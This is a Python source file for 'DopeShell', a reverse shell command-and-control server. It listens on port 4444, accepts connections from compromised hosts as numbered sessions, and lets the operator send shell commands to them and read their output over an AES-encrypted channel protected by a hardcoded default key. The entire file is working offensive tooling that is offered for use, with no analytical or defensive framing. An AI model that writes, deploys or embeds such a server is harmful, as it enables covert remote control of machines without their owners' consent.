# dopeshell/server.py

import socket
import threading
import base64
import os
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class DopeShellServer:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.sessions = {}
        self.session_counter = 1
        self.active_session = None

    def encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(encrypted_data)

    def decrypt(self, data):
        data = base64.b64decode(data)
        iv = data[:16]
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
        return decrypted_data

    def handle_client(self, session_id, client_socket):
        while True:
            if session_id != self.active_session:
                continue
            command = input(f"Session {session_id} Shell> ")
            if command.lower() == 'exit':
                client_socket.send(self.encrypt(command.encode('utf-8')))
                break
            elif command.lower().startswith("switch"):
                _, new_session_id = command.split()
                if int(new_session_id) in self.sessions:
                    self.active_session = int(new_session_id)
                    print(f"[+] Switched to session {new_session_id}")
                else:
                    print(f"[-] Session {new_session_id} does not exist.")
                continue
            client_socket.send(self.encrypt(command.encode('utf-8')))
            response = client_socket.recv(4096)
            print(self.decrypt(response).decode('utf-8'))
        client_socket.close()

    def run(self):
        print(f"[*] Listening on {self.host}:{self.port}")
        while True:
            client_socket, addr = self.sock.accept()
            session_id = self.session_counter
            print(f"[*] Connection from {addr}, Session ID: {session_id}")
            self.sessions[session_id] = client_socket
            client_handler = threading.Thread(target=self.handle_client, args=(session_id, client_socket,))
            client_handler.daemon = True
            client_handler.start()
            self.session_counter += 1

            if not self.active_session:
                self.active_session = session_id
                print(f"[+] Automatically switched to session {session_id}")

    def list_sessions(self):
        print("Active Sessions:")
        for session_id in self.sessions:
            status = "Active" if session_id == self.active_session else "Idle"
            print(f"Session {session_id}: {status}")

def main():
    parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Server")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind the server to (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444, help="Port to bind the server to (default: 4444)")
    parser.add_argument("--key", type=str, default="myverystrongpasswordo32bitlength", help="Encryption key (32 bytes)")

    args = parser.parse_args()

    key = args.key.encode("utf-8")
    server = DopeShellServer(args.host, args.port, key)
    server.run()

if __name__ == "__main__":
    main()